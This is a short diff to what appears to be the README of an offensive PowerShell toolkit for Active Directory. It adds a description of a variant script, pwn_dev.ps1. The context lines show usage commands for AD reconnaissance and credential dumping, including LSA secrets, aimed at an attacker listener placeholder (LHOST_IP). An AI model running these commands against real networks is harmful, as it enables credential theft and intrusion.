@@ -18,3 +18,7 @@ adrecon -ipaddress LHOST_IP
 getcreds -ipaddress LHOST_IP
 getcreds -ipaddress LHOST_IP -lsa
 ```
+
+## pwn_dev.ps1
+
+Certain downstream AD enumerations fail if a PS Credential object is not properly created. This script is more permissive than pwn.ps1 but less fault tolerant.
